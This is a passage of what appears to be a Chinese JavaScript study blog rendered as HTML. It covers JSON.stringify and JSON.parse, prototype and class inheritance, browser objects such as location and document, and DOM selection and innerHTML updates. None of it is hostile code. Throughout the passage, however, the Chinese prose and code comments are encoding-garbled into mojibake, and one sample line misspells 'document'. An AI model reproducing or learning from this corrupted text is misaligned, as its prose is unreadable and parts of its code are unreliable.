,\w,\d</li><li>å¤§å°å†™ç”¨iæ ‡å¿—</li></ul><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><ul><li>numberï¼šå’ŒJavaScriptçš„<code>number</code>å®Œå…¨ä¸€è‡´ï¼›</li><li>booleanï¼šå°±æ˜¯JavaScriptçš„<code>true</code>æˆ–<code>false</code>ï¼›</li><li>stringï¼šå°±æ˜¯JavaScriptçš„<code>string</code>ï¼›</li><li>nullï¼šå°±æ˜¯JavaScriptçš„<code>null</code>ï¼›</li><li>arrayï¼šå°±æ˜¯JavaScriptçš„<code>Array</code>è¡¨ç¤ºæ–¹å¼â€”â€”<code>[]</code>ï¼›</li><li>objectï¼šå°±æ˜¯JavaScriptçš„<code>{ ... }</code>è¡¨ç¤ºæ–¹å¼ã€‚</li></ul><p>ä¸ºäº†ç»Ÿä¸€è§£æï¼ŒJSONçš„å­—ç¬¦ä¸²è§„å®šå¿…é¡»ç”¨åŒå¼•å·<code>&quot;&quot;</code>ï¼ŒObjectçš„é”®ä¹Ÿå¿…é¡»ç”¨åŒå¼•å·<code>&quot;&quot;</code>ã€‚</p><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a><strong>åºåˆ—åŒ–</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">name: <span class="string">'xiaoming'</span>,</span><br><span class="line">age: <span class="number">14</span>,</span><br><span class="line">height: <span class="number">165</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming);</span><br><span class="line"><span class="built_in">console</span>.log(s); <span class="comment">//&#123;"name":"xiaoming","age":14,"height":165&#125;</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming,<span class="literal">null</span>,<span class="string">' '</span>); </span><br><span class="line"><span class="built_in">console</span>.log(s); <span class="comment">//"&#123;</span></span><br><span class="line"> <span class="string">"name"</span>: <span class="string">"xiaoming"</span>,</span><br><span class="line"> <span class="string">"age"</span>: <span class="number">14</span>,</span><br><span class="line"> <span class="string">"height"</span>: <span class="number">165</span></span><br><span class="line">&#125;<span class="string">"</span></span><br><span class="line"><span class="string">//stringify(a,b,c)</span></span><br><span class="line"><span class="string">//aä¸ºå¯¹è±¡åï¼Œbä¸ºæŒ‡å®šçš„å±æ€§æˆ–è€…ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå¦‚['age','name'],cä¸º' 'ä»£è¡¨é€è¡Œè¾“å‡º</span></span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>æ‹¿åˆ°ä¸€ä¸ªJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨<code>JSON.parse()</code>æŠŠå®ƒå˜æˆä¸€ä¸ªJavaScriptå¯¹è±¡ã€‚</p><p><code>JSON.parse()</code>è¿˜å¯ä»¥æ¥æ”¶ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è½¬æ¢è§£æå‡ºçš„å±æ€§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">'&#123;"name":"å°æ˜","age":14&#125;'</span>); <span class="comment">// Object &#123;name: 'å°æ˜', age: 14&#125;</span></span><br><span class="line"><span class="comment">//æ¥å—å‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"name":"å°æ˜","age":14&#125;'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">key,value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (key ===<span class="string">'name'</span>)&#123;<span class="keyword">return</span> value + <span class="string">'åŒå­¦'</span>&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> value;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="é¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#é¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="é¢å‘å¯¹è±¡ç¼–ç¨‹"></a>é¢å‘å¯¹è±¡ç¼–ç¨‹</h1><p>åœ¨jsä¸­æ²¡æœ‰ç±»çš„æ¦‚å¿µï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½æ˜¯å®ä¾‹ï¼Œç»§æ‰¿å…³ç³»ä¸è¿‡æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡çš„åŸå‹æŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡è€Œå·²ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; åŸå‹å¯¹è±¡:</span><br><span class="line">var Student &#x3D; &#123;</span><br><span class="line">    name: &#39;Robot&#39;,</span><br><span class="line">    height: 1.2,</span><br><span class="line">    run: function () &#123;</span><br><span class="line">        console.log(this.name + &#39; is running...&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function createStudent(name) &#123;</span><br><span class="line">    &#x2F;&#x2F; åŸºäºStudentåŸå‹åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡:</span><br><span class="line">    var s &#x3D; Object.create(Student);</span><br><span class="line">    &#x2F;&#x2F; åˆå§‹åŒ–æ–°å¯¹è±¡:</span><br><span class="line">    s.name &#x3D; name;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var xiaoming &#x3D; createStudent(&#39;å°æ˜&#39;);</span><br><span class="line">xiaoming.run(); &#x2F;&#x2F; å°æ˜ is running...</span><br><span class="line">xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure><h2 id="åˆ›å»ºå¯¹è±¡"><a href="#åˆ›å»ºå¯¹è±¡" class="headerlink" title="åˆ›å»ºå¯¹è±¡"></a>åˆ›å»ºå¯¹è±¡</h2><p>JavaScriptå¯¹æ¯ä¸ªåˆ›å»ºçš„å¯¹è±¡éƒ½ä¼šè®¾ç½®ä¸€ä¸ªåŸå‹ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹å¯¹è±¡ã€‚</p><p>å½“æˆ‘ä»¬ç”¨<code>obj.xxx</code>è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼ŒJavaScriptå¼•æ“å…ˆåœ¨å½“å‰å¯¹è±¡ä¸ŠæŸ¥æ‰¾è¯¥å±æ€§ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±åˆ°å…¶åŸå‹å¯¹è±¡ä¸Šæ‰¾ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¸€ç›´ä¸Šæº¯åˆ°<code>Object.prototype</code>å¯¹è±¡ï¼Œæœ€åï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±åªèƒ½è¿”å›<code>undefined</code>ã€‚</p><p><strong>æ„é€ å‡½æ•°</strong></p><p>é™¤äº†ç›´æ¥ç”¨<code>{ ... }</code>åˆ›å»ºä¸€ä¸ªå¯¹è±¡å¤–ï¼ŒJavaScriptè¿˜å¯ä»¥ç”¨ä¸€ç§æ„é€ å‡½æ•°çš„æ–¹æ³•æ¥åˆ›å»ºå¯¹è±¡ã€‚å®ƒçš„ç”¨æ³•æ˜¯ï¼Œå…ˆå®šä¹‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Student(name) &#123;</span><br><span class="line">    this.name &#x3D; name;</span><br><span class="line">    this.hello &#x3D; function () &#123;</span><br><span class="line">        alert(&#39;Hello, &#39; + this.name + &#39;!&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var xiaoming &#x3D; new Student(&#39;xiaoming&#39;)</span><br></pre></td></tr></table></figure><p>å†™äº†<code>new</code>ï¼Œå®ƒå°±å˜æˆäº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒç»‘å®šçš„<code>this</code>æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œå¹¶é»˜è®¤è¿”å›<code>this</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸éœ€è¦åœ¨æœ€åå†™<code>return this;</code></p><p><strong>åŸå‹é“¾ï¼š</strong></p><p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730195400823.png" alt="image-20200730195400823"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å¸¸ç”¨åˆ›å»ºå¯¹è±¡</span><br><span class="line">function Student(props)&#123;</span><br><span class="line">this.name &#x3D; props.name;</span><br><span class="line">this.grade &#x3D; props.grade;</span><br><span class="line">&#125;</span><br><span class="line">Student.prototype.hello &#x3D; function()&#123;</span><br><span class="line">alert(&#39;hello&#39;+this.name+&#39;.&#39;);</span><br><span class="line">&#125;</span><br><span class="line">function createStudent(props)&#123;</span><br><span class="line">return new Student(props);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦è®©åˆ›å»ºçš„å¯¹è±¡å…±äº«ä¸€ä¸ª<code>hello</code>å‡½æ•°ï¼Œæ ¹æ®å¯¹è±¡çš„å±æ€§æŸ¥æ‰¾åŸåˆ™ï¼Œæˆ‘ä»¬åªè¦æŠŠ<code>hello</code>å‡½æ•°ç§»åŠ¨åˆ°<code>xiaoming</code>ã€<code>xiaohong</code>è¿™äº›å¯¹è±¡å…±åŒçš„åŸå‹ä¸Šå°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯<code>Student.prototype</code></p><p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730200247420.png" alt="image-20200730200247420"></p><h2 id="åŸå‹ç»§æ‰¿"><a href="#åŸå‹ç»§æ‰¿" class="headerlink" title="åŸå‹ç»§æ‰¿"></a>åŸå‹ç»§æ‰¿</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = props.name || <span class="string">'Unnamed'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hello, '</span> + <span class="keyword">this</span>.name + <span class="string">'!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PrimaryStudent</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨Studentæ„é€ å‡½æ•°ï¼Œç»‘å®šthiså˜é‡:</span></span><br><span class="line">    Student.call(<span class="keyword">this</span>, props);</span><br><span class="line">    <span class="keyword">this</span>.grade = props.grade || <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; <span class="built_in">Object</span>.prototype ----&gt; <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>ç†è§£æ–°çš„åŸå‹é“¾</p><p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730203439073.png" alt="image-20200730203439073"></p><h2 id="classç»§æ‰¿"><a href="#classç»§æ‰¿" class="headerlink" title="classç»§æ‰¿"></a>classç»§æ‰¿</h2><p><strong>classåˆ›å»ºå¯¹è±¡</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hello() &#123;</span><br><span class="line">        alert(<span class="string">'Hello, '</span> + <span class="keyword">this</span>.name + <span class="string">'!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">'xiaoming'</span>);</span><br><span class="line">xiaoming.hello();</span><br></pre></td></tr></table></figure><p><strong>classç»§æ‰¿</strong></p><p>ç›´æ¥é€šè¿‡<code>extends</code>å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrimaryStudent</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name, grade) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name); <span class="comment">// è®°å¾—ç”¨superè°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•!</span></span><br><span class="line">        <span class="keyword">this</span>.grade = grade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myGrade() &#123;</span><br><span class="line">        alert(<span class="string">'I am at grade '</span> + <span class="keyword">this</span>.grade);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦é€šè¿‡<code>super(name)</code>æ¥è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œå¦åˆ™çˆ¶ç±»çš„<code>name</code>å±æ€§æ— æ³•æ­£å¸¸åˆå§‹åŒ–ã€‚</p><h1 id="æµè§ˆå™¨"><a href="#æµè§ˆå™¨" class="headerlink" title="æµè§ˆå™¨"></a>æµè§ˆå™¨</h1><h2 id="æµè§ˆå™¨å¯¹è±¡"><a href="#æµè§ˆå™¨å¯¹è±¡" class="headerlink" title="æµè§ˆå™¨å¯¹è±¡"></a>æµè§ˆå™¨å¯¹è±¡</h2><p><strong>window</strong></p><p><code>window</code>å¯¹è±¡ä¸ä½†å……å½“å…¨å±€ä½œç”¨åŸŸï¼Œè€Œä¸”è¡¨ç¤ºæµè§ˆå™¨çª—å£ã€‚</p><ul><li><code>innerWidth</code> <code>innerHeight</code>å¯ä»¥è·å–æµè§ˆå™¨çª—å£çš„å†…éƒ¨é«˜åº¦å’Œå®½åº¦</li><li><code>outerWidth</code> <code>outerHeight</code>è·å–æµè§ˆå™¨çª—å£çš„æ•´ä¸ªå®½é«˜</li></ul><p><strong>navigator</strong></p><p><code>navigator</code>å¯¹è±¡è¡¨ç¤ºæµè§ˆå™¨çš„ä¿¡æ¯ï¼Œæœ€å¸¸ç”¨çš„å±æ€§åŒ…æ‹¬ï¼š</p><ul><li>navigator.appNameï¼šæµè§ˆå™¨åç§°ï¼›</li><li>navigator.appVersionï¼šæµè§ˆå™¨ç‰ˆæœ¬ï¼›</li><li>navigator.languageï¼šæµè§ˆå™¨è®¾ç½®çš„è¯­è¨€ï¼›</li><li>navigator.platformï¼šæ“ä½œç³»ç»Ÿç±»å‹ï¼›</li><li>navigator.userAgentï¼šæµè§ˆå™¨è®¾å®šçš„<code>User-Agent</code>å­—ç¬¦ä¸²ã€‚</li></ul><h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><p><code>screen</code>å¯¹è±¡è¡¨ç¤ºå±å¹•çš„ä¿¡æ¯ï¼Œå¸¸ç”¨çš„å±æ€§æœ‰ï¼š</p><ul><li>screen.widthï¼šå±å¹•å®½åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼›</li><li>screen.heightï¼šå±å¹•é«˜åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼›</li><li>screen.colorDepthï¼šè¿”å›é¢œè‰²ä½æ•°ï¼Œå¦‚8ã€16ã€24ã€‚</li></ul><h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p><code>location</code>å¯¹è±¡è¡¨ç¤ºå½“å‰é¡µé¢çš„URLä¿¡æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location.href  &#x2F;&#x2F;url</span><br><span class="line">location.protocol; &#x2F;&#x2F; &#39;http&#39;</span><br><span class="line">location.host; &#x2F;&#x2F; &#39;www.example.com&#39;</span><br><span class="line">location.port; &#x2F;&#x2F; &#39;8080&#39;</span><br><span class="line">location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;</span><br><span class="line">location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;</span><br><span class="line">location.hash; &#x2F;&#x2F; &#39;TOP&#39;</span><br><span class="line">location.assign(&#39;...&#39;)  &#x2F;&#x2F;åŠ è½½ä¸€ä¸ªæ–°çš„é¡µé¢</span><br><span class="line">location.reload()  &#x2F;&#x2F;é‡æ–°åŠ è½½å½“å‰é¡µé¢</span><br></pre></td></tr></table></figure><h3 id="document"><a href="#document" class="headerlink" title="document"></a>document</h3><p><code>document</code>å¯¹è±¡è¡¨ç¤ºå½“å‰é¡µé¢ã€‚ç”±äºHTMLåœ¨æµè§ˆå™¨ä¸­ä»¥DOMå½¢å¼è¡¨ç¤ºä¸ºæ ‘å½¢ç»“æ„ï¼Œ<code>document</code>å¯¹è±¡å°±æ˜¯æ•´ä¸ªDOMæ ‘çš„æ ¹èŠ‚ç‚¹ã€‚</p><p>ç”¨<code>document</code>å¯¹è±¡æä¾›çš„<code>getElementById()</code>å’Œ<code>getElementsByTagName()</code>å¯ä»¥æŒ‰IDè·å¾—ä¸€ä¸ªDOMèŠ‚ç‚¹å’ŒæŒ‰Tagåç§°è·å¾—ä¸€ç»„DOMèŠ‚ç‚¹</p><p><code>document</code>å¯¹è±¡è¿˜æœ‰ä¸€ä¸ª<code>cookie</code>å±æ€§ï¼Œå¯ä»¥è·å–å½“å‰é¡µé¢çš„Cookieã€‚JavaScriptå¯ä»¥é€šè¿‡<code>document.cookie</code>è¯»å–åˆ°å½“å‰é¡µé¢çš„Cookieã€‚</p><h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p><code>history</code>å¯¹è±¡ä¿å­˜äº†æµè§ˆå™¨çš„å†å²è®°å½•ï¼ŒJavaScriptå¯ä»¥è°ƒç”¨<code>history</code>å¯¹è±¡çš„<code>back()</code>æˆ–<code>forward ()</code>ï¼Œç›¸å½“äºç”¨æˆ·ç‚¹å‡»äº†æµè§ˆå™¨çš„â€œåé€€â€æˆ–â€œå‰è¿›â€æŒ‰é’®ã€‚ä½†ç°åœ¨ä¸ä½¿ç”¨ã€‚</p><h2 id="æ“ä½œDOM"><a href="#æ“ä½œDOM" class="headerlink" title="æ“ä½œDOM"></a>æ“ä½œDOM</h2><p>ç”±äºHTMLæ–‡æ¡£è¢«æµè§ˆå™¨è§£æåå°±æ˜¯ä¸€æ£µDOMæ ‘ï¼Œè¦æ”¹å˜HTMLçš„ç»“æ„ï¼Œå°±éœ€è¦é€šè¿‡JavaScriptæ¥æ“ä½œDOMã€‚</p><p>å§‹ç»ˆè®°ä½DOMæ˜¯ä¸€ä¸ªæ ‘å½¢ç»“æ„ã€‚æ“ä½œä¸€ä¸ªDOMèŠ‚ç‚¹å®é™…ä¸Šå°±æ˜¯è¿™ä¹ˆå‡ ä¸ªæ“ä½œï¼š</p><ul><li>æ›´æ–°ï¼šæ›´æ–°è¯¥DOMèŠ‚ç‚¹çš„å†…å®¹ï¼Œç›¸å½“äºæ›´æ–°äº†è¯¥DOMèŠ‚ç‚¹è¡¨ç¤ºçš„HTMLçš„å†…å®¹ï¼›</li><li>éå†ï¼šéå†è¯¥DOMèŠ‚ç‚¹ä¸‹çš„å­èŠ‚ç‚¹ï¼Œä»¥ä¾¿è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œï¼›</li><li>æ·»åŠ ï¼šåœ¨è¯¥DOMèŠ‚ç‚¹ä¸‹æ–°å¢ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œç›¸å½“äºåŠ¨æ€å¢åŠ äº†ä¸€ä¸ªHTMLèŠ‚ç‚¹ï¼›</li><li>åˆ é™¤ï¼šå°†è¯¥èŠ‚ç‚¹ä»HTMLä¸­åˆ é™¤ï¼Œç›¸å½“äºåˆ æ‰äº†è¯¥DOMèŠ‚ç‚¹çš„å†…å®¹ä»¥åŠå®ƒåŒ…å«çš„æ‰€æœ‰å­èŠ‚ç‚¹ã€‚</li></ul><p>åœ¨æ“ä½œä¸€ä¸ªDOMèŠ‚ç‚¹å‰ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡å„ç§æ–¹å¼å…ˆæ‹¿åˆ°è¿™ä¸ªDOMèŠ‚ç‚¹ã€‚æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯<code>document.getElementById()</code>å’Œ<code>document.getElementsByTagName()</code>ï¼Œä»¥åŠCSSé€‰æ‹©å™¨<code>document.getElementsByClassName()</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#39;test&#39;);  &#x2F;&#x2F; è¿”å›IDä¸º&#39;test&#39;çš„èŠ‚ç‚¹ï¼š</span><br><span class="line">ocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;);  &#x2F;&#x2F; å…ˆå®šä½IDä¸º&#39;test-table&#39;çš„èŠ‚ç‚¹ï¼Œå†è¿”å›å…¶å†…éƒ¨æ‰€æœ‰trèŠ‚ç‚¹ï¼š</span><br><span class="line">document.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;);  &#x2F;&#x2F; å…ˆå®šä½IDä¸º&#39;test-div&#39;çš„èŠ‚ç‚¹ï¼Œå†è¿”å›å…¶å†…éƒ¨æ‰€æœ‰classåŒ…å«redçš„èŠ‚ç‚¹ï¼š</span><br><span class="line">test.firstElementChild &#x2F;&#x2F;testä¸‹ç¬¬ä¸€ä¸ªç»“ç‚¹</span><br><span class="line">test.lastElementChild  &#x2F;&#x2F;testä¸‹æœ€åä¸€ä¸ªç»“ç‚¹</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨<code>querySelector()</code>å’Œ<code>querySelectorAll()</code>ï¼Œéœ€è¦äº†è§£selectorè¯­æ³•ï¼Œç„¶åä½¿ç”¨æ¡ä»¶æ¥è·å–èŠ‚ç‚¹ï¼Œæ›´åŠ æ–¹ä¾¿ã€‚</p><p><strong>ä½œä¸š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTMLç»“æ„ --&gt;</span><br><span class="line">&lt;div id=<span class="string">"test-div"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"c-red"</span>&gt;</span><br><span class="line">    &lt;p id=<span class="string">"test-p"</span>&gt;JavaScript&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Java&lt;/</span>p&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div class="c-red c-green"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Python&lt;/</span>p&gt;</span><br><span class="line">    &lt;p&gt;Ruby&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Swift&lt;/</span>p&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div class="c-green"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Scheme&lt;/</span>p&gt;</span><br><span class="line">    &lt;p&gt;Haskell&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ é€‰æ‹©&lt;p&gt;JavaScript&lt;/</span>p&gt;:</span><br><span class="line"><span class="keyword">var</span> js = <span class="built_in">document</span>.getElementById(<span class="string">'test-p'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©&lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'c-red'</span>)[<span class="number">1</span>].getElementsByTagName(<span class="string">'p'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©&lt;p&gt;Haskell&lt;/p&gt;:</span></span><br><span class="line"><span class="keyword">var</span> haskell = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'c-green'</span>)[<span class="number">1</span>].lastElementChild;</span><br></pre></td></tr></table></figure><h3 id="æ›´æ–°DOM"><a href="#æ›´æ–°DOM" class="headerlink" title="æ›´æ–°DOM"></a>æ›´æ–°DOM</h3><p>ä¸€ç§æ˜¯ä¿®æ”¹<code>innerHTML</code>å±æ€§ï¼Œè¿™ä¸ªæ–¹å¼éå¸¸å¼ºå¤§ï¼Œä¸ä½†å¯ä»¥ä¿®æ”¹ä¸€ä¸ªDOMèŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹ï¼Œè¿˜å¯ä»¥ç›´æ¥é€šè¿‡HTMLç‰‡æ®µä¿®æ”¹DOMèŠ‚ç‚¹å†…éƒ¨çš„å­æ ‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;è·å–&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;</span><br><span class="line">var p &#x3D; document.getElementById(&#39;p&#39;);</span><br><span class="line">p.innerHTML &#x3D; &#39;ABC&#39;</span><br><span class="line">&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ˜¯ä¿®æ”¹<code>innerText</code>æˆ–<code>textContent</code>å±æ€§ï¼Œè¿™æ ·å¯ä»¥è‡ªåŠ¨å¯¹å­—ç¬¦ä¸²è¿›è¡ŒHTMLç¼–ç ï¼Œä¿è¯æ— æ³•è®¾ç½®ä»»ä½•HTMLæ 